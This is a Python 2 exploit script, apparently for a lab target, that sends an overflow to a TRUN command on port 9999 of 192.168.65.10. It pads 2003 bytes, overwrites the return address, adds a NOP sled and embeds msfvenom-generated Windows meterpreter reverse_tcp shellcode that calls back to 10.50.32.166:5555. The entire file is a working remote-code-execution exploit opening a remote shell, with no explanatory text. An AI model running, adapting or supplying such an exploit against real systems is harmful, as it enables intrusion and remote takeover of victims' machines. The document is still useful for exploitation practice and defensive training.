#!/usr/bin/env python

import socket

# 62 50 12 A0 -> "\xa0\x12\x50\x62"

# initialize buffer
buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xa0\x12\x50\x62"
buf += "\x90" * 10
# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.32.166 lport=5555 -b "\x00" -f python
buf += b"\xbf\x40\xb6\x4f\xba\xd9\xec\xd9\x74\x24\xf4\x5d"
buf += b"\x33\xc9\xb1\x59\x31\x7d\x14\x83\xed\xfc\x03\x7d"
buf += b"\x10\xa2\x43\xb3\x52\xad\xac\x4c\xa3\xd1\x9d\x9e"
buf += b"\x2a\xf4\xba\x95\x7f\xc6\xc9\xf8\x73\xad\x9c\xe8"
buf += b"\xba\x4e\xab\x63\x95\xbf\x1b\xc9\xc3\x8e\xa3\x62"
buf += b"\x37\x91\x5f\x79\x64\x71\x61\xb2\x79\x70\xa6\x04"
buf += b"\xf7\x9d\x7a\x1c\xa5\x71\xf0\x60\x76\x70\xd6\xee"
buf += b"\xc6\x0a\x81\x75\x06\x9e\x61\x77\x57\xd5\x22\x57"
buf += b"\x56\x3a\x59\xdf\x40\xec\xdb\x29\x04\x30\xad\x22"
buf += b"\xd1\xc3\x1c\xca\x1b\x05\x6f\xf4\xb0\x68\x5f\xf9"
buf += b"\xc9\xad\x58\xe2\xbf\xc5\x9a\x9f\xc7\x1e\xe0\x7b"
buf += b"\x4d\x80\x42\x0f\xf5\x64\x72\xdc\x60\xef\x78\xa9"
buf += b"\xe7\xb7\x9c\x2c\x2b\xcc\x99\xa5\xca\x02\x28\xfd"
buf += b"\xe8\x86\x70\xa5\x91\x9f\xdc\x08\xad\xff\xb9\xf5"
buf += b"\x0b\x74\x2b\xe3\x2c\x75\xb3\x0c\x71\xe1\x7f\xc1"
buf += b"\x8a\xf1\x17\x52\xf8\xc3\xb8\xc8\x96\x6f\x30\xd7"
buf += b"\x61\xe6\x56\xe8\xbe\x40\x36\x16\x3f\xb0\x1e\xdd"
buf += b"\x6b\xe0\x08\xf4\x13\x6b\xc9\xf9\xc1\x01\xc3\x6d"
buf += b"\xe0\xe7\xf3\xcb\x9c\x05\xf4\x06\xee\x80\x12\x78"
buf += b"\x40\xc2\x8a\x39\x30\xa2\x7a\xd2\x5a\x2d\xa4\xc2"
buf += b"\x64\xe4\xcd\x69\x8b\x50\xa5\x05\x32\xf9\x3d\xb7"
buf += b"\xbb\xd4\x3b\xf7\x30\xdc\xbc\xb6\xb0\x95\xae\xaf"
buf += b"\xa6\x55\x2f\x30\x43\x55\x45\x34\xc5\x02\xf1\x36"
buf += b"\x30\x64\x5e\xc8\x17\xf7\x99\x36\xe6\xc1\xd2\x01"
buf += b"\x7c\x6d\x8d\x6d\x90\x6d\x4d\x38\xfa\x6d\x25\x9c"
buf += b"\x5e\x3e\x50\xe3\x4a\x53\xc9\x76\x75\x05\xbd\xd1"
buf += b"\x1d\xab\x98\x16\x82\x54\xcf\x24\xc5\xaa\x8d\x02"
buf += b"\x6e\xc2\x6d\x13\x8e\x12\x04\x93\xde\x7a\xd3\xbc"
buf += b"\xd1\x4a\x1c\x17\xba\xc2\x97\xf6\x08\x73\xa7\xd2"
buf += b"\xcd\x2d\xa8\xd1\xd5\xde\xd3\x9a\xea\x1f\x24\xb3"
buf += b"\x8e\x20\x24\xbb\xb0\x1d\xf2\x82\xc6\x60\xc6\xb0"
buf += b"\xd9\xd7\x6b\x90\x73\x17\x3f\xe2\x51"

# build socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# establish connection
s.connect(("192.168.65.10", 9999))
# print inital receive buffer
print s.recv(1024)
# send buffer
s.send(buf)
# print second receive buffer
print s.recv(1024)
# close socket
s.close()
